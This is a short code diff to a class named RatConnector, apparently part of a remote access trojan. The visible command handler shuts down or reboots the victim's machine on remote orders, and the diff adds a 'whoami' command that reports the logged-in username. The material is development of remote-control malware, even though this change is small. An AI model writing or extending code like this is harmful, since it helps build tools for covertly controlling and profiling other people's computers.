@@ -272,6 +272,9 @@ class RatConnector:
                 elif command[0] == "shutdown":
                     os.system("shutdown /s /t 1")
 
+                elif command[0] == "whoami":
+                    commandResponse = os.getlogin()
+
                 elif command[0] == "reboot":
                     os.system("shutdown /r /t 1")
                 
